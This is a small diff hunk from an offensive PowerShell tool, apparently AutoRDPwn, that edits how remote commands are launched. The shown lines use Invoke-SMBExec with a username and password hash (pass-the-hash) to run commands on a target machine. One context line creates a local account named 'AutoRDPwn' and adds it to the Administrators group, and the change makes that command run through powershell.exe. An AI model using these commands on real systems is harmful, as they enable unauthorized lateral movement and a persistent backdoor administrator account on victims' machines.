@@ -100,7 +100,7 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps2" -verbose
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps3" -verbose
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps4" -verbose
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "cmd /c $Ps5" -verbose }        
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps5" -verbose }        
 
 	'3' {
         Write-Host ""
